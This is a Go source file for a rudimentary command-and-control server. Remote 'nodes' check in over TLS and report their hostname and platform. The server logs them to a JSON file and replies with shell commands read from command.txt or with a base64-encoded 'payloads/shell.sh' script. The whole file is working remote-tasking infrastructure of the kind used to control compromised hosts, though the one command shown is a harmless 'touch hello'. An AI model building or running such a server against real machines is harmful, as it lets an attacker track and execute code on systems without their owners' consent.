package main

import (
	b64 "encoding/base64"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"strings"
	"time"
)

const banner string = `

███╗   ██╗██╗ ██████╗███████╗ ██████╗██████╗     ███████╗███████╗██████╗ ██╗   ██╗███████╗██████╗ 
████╗  ██║██║██╔════╝██╔════╝██╔════╝╚════██╗    ██╔════╝██╔════╝██╔══██╗██║   ██║██╔════╝██╔══██╗
██╔██╗ ██║██║██║     █████╗  ██║      █████╔╝    ███████╗█████╗  ██████╔╝██║   ██║█████╗  ██████╔╝
██║╚██╗██║██║██║     ██╔══╝  ██║     ██╔═══╝     ╚════██║██╔══╝  ██╔══██╗╚██╗ ██╔╝██╔══╝  ██╔══██╗
██║ ╚████║██║╚██████╗███████╗╚██████╗███████╗    ███████║███████╗██║  ██║ ╚████╔╝ ███████╗██║  ██║
╚═╝  ╚═══╝╚═╝ ╚═════╝╚══════╝ ╚═════╝╚══════╝    ╚══════╝╚══════╝╚═╝  ╚═╝  ╚═══╝  ╚══════╝╚═╝  ╚═╝
                                                                                                  

`

type Command struct {
	NodeID  string `json:"NodeID"`
	Action  string `json:"Action"`
	Content string `json:"Command"`
}

type old_node_check_in struct {
	ID       string
	Hostname string
	Platform string
}

type node struct {
	ID             string
	Hostname       string
	Platform       string
	First_Check_In string
	Last_Check_In  string
}

// The main array of all nodes that have checked in.
var nodes []node = read_nodes_from_file()

func nodeCheckIn(w http.ResponseWriter, req *http.Request) {

	// Get's the current time
	dt := time.Now()

	// Decode the json body
	decoder := json.NewDecoder(req.Body)
	var node_that_checked_in old_node_check_in
	err := decoder.Decode(&node_that_checked_in)
	if err != nil {
		panic(err)
	}

	// Adding the node to the list (Needs to be only if new node)

	if is_new_node(node_that_checked_in.ID) == true {
		fmt.Println("Damn look it's a new node!")
		nodes = append(nodes, createNode(node_that_checked_in.ID, node_that_checked_in.Hostname, node_that_checked_in.Platform, dt.String()))
	} else {

		update_node(node_that_checked_in.ID, dt.String())

		fmt.Println("Node re-checked in")
	}

	// Output something pretty
	fmt.Println()
	fmt.Println("============= New Check in =============")

	fmt.Println("ID: " + node_that_checked_in.ID)
	fmt.Println("Hostname: " + node_that_checked_in.Hostname)
	fmt.Println("Platform: " + node_that_checked_in.Platform)
	fmt.Println("Time: " + dt.String())

	fmt.Println("============= ----------- =============")

	// response := "Hello World"

	// Send the response back
	// fmt.Fprintf(w, `{"message": "hello world"}`)

	var response = []byte(`
	{
		"task": "run command",  
		"arg" : "touch hello"
		
	}`)

	// Send the response back
	fmt.Fprintf(w, string(response))

	save_nodes_to_file()
}

func old_nodeCheckIn(w http.ResponseWriter, req *http.Request) {

	// Get's the current time
	dt := time.Now()

	// Decode the json body
	decoder := json.NewDecoder(req.Body)
	var node_that_checked_in old_node_check_in
	err := decoder.Decode(&node_that_checked_in)
	if err != nil {
		panic(err)
	}

	// Adding the node to the list (Needs to be only if new node)

	if is_new_node(node_that_checked_in.ID) == true {
		fmt.Println("Damn look it's a new node!")
		nodes = append(nodes, createNode(node_that_checked_in.ID, node_that_checked_in.Hostname, node_that_checked_in.Platform, dt.String()))
	} else {

		update_node(node_that_checked_in.ID, dt.String())

		fmt.Println("Node re-checked in")
	}

	// Output something pretty
	fmt.Println()
	fmt.Println("============= New Check in =============")

	fmt.Println("ID: " + node_that_checked_in.ID)
	fmt.Println("Hostname: " + node_that_checked_in.Hostname)
	fmt.Println("Platform: " + node_that_checked_in.Platform)
	fmt.Println("Time: " + dt.String())

	fmt.Println("============= ----------- =============")

	//JSON reponse

	// Get a new command
	Command := refresh_commands()

	var response = []byte(`
	{
		"ID": "` + node_that_checked_in.ID + `", 
		"command": "run", 
		"details": "` + Command + `"
	}`)

	// Send the response back
	fmt.Fprintf(w, string(response))

	// Outputs all the nodes to the console
	// display_all_nodes()

	save_nodes_to_file()

}

func nodeSendFile(w http.ResponseWriter, req *http.Request) {

	// Decode the json body
	decoder := json.NewDecoder(req.Body)
	var node old_node_check_in
	err := decoder.Decode(&node)
	if err != nil {
		panic(err)
	}

	script := read_script("payloads/shell.sh")

	var response = []byte(`
	{
		"ID": "` + node.ID + `",
		"command": "File",
		"details": "` + script + `"
	}`)

	// Sending the reponse
	fmt.Fprintf(w, string(response))

}

func handleRequests() {

	// myRouter := mux.NewRouter().StrictSlash(true)

	// myRouter.HandleFunc("/test", shrug).Methods("GET")
	// myRouter.HandleFunc("/old-checkin", old_nodeCheckIn).Methods("POST")

	// myRouter.HandleFunc("/checkin", nodeCheckIn).Methods("POST")
	// myRouter.HandleFunc("/old-payload", nodeSendFile).Methods("POST")

	http.HandleFunc("/checkin", nodeCheckIn)
	// http.HandleFunc("/getPayload", getPayload)

	log.Fatal(http.ListenAndServeTLS(":8081", "server.crt", "server.key", nil))
}

func main() {

	fmt.Println(banner)

	handleRequests()

}

func refresh_commands() string {

	//Reading the command file, this will be JSON at some point I reckon

	bFile, _ := ioutil.ReadFile("command.txt")
	command := string(bFile)
	command = strings.Replace(command, "\n", "", -1)

	return command
}

func read_script(path string) string {

	// Read the file
	bFile, _ := ioutil.ReadFile(path)
	script := string(bFile)
	// script = strings.Replace(script, "\n", "", -1)

	// fmt.Println(script)

	// here is where we turn the file into some nice data I think
	encoded_script := b64.StdEncoding.EncodeToString([]byte(script))

	return encoded_script

}

////////////////////////////////////
/// Node slice  			    ////
////////////////////////////////////

func createNode(ID string, Hostname string, Platform string, Timestamp string) node {

	newNode := node{ID, Hostname, Platform, Timestamp, Timestamp}
	return newNode

}

func is_new_node(input_ID string) bool {

	for _, value := range nodes {
		if value.ID == input_ID {
			return false
		}
	}

	return true
}

// updates the node in the list
func update_node(ID string, Timestamp string) {

	node_position, error := find_node(ID)
	if error != "" {
		fmt.Println(error)
		return
	}

	nodes[node_position].Last_Check_In = Timestamp

}

// Finds a nodes position in the slice
func find_node(input_ID string) (int, string) {

	for i, value := range nodes {
		if value.ID == input_ID {
			return i, ""
		}
	}

	// returns 0 if it can't find anything.
	// pretty sure this small brain, but ehh
	return 0, "💀 Couldn't find node"
}

func display_all_nodes() {

	fmt.Println("")

	fmt.Println("[][][][][][][][][] Nodes [][][][][][][][][]")
	fmt.Println()
	for _, value := range nodes {
		fmt.Println("NodeID:        " + value.ID)
		fmt.Println("Hostname:      " + value.Hostname)
		fmt.Println("Platform:      " + value.Platform)
		fmt.Println("First Seen:    " + value.First_Check_In)
		fmt.Println("Last Seen:     " + value.Last_Check_In)
		fmt.Println("------------------ ===== ------------------")
	}
}

////////////////////////////////////
/// File Nonsense			    ////
////////////////////////////////////

func save_nodes_to_file() {
	out, _ := json.MarshalIndent(nodes, "", "  ")
	err := ioutil.WriteFile("nodes.json", out, 0644)
	if err != nil {
		fmt.Println(err.Error())
	}
}

func read_nodes_from_file() []node {
	fmt.Println("These are the nodes allready in the file")
	fmt.Printf("\n\n")
	content, err := ioutil.ReadFile("nodes.json")
	if err != nil {
		fmt.Println(err.Error())
	}

	var nodes []node
	err3 := json.Unmarshal(content, &nodes)
	if err3 != nil {
		fmt.Println("error with Unmarshal")
		fmt.Println(err3.Error())
	}

	for _, x := range nodes {
		fmt.Println(x.ID)
	}

	fmt.Printf("\n\n")
	return nodes
}
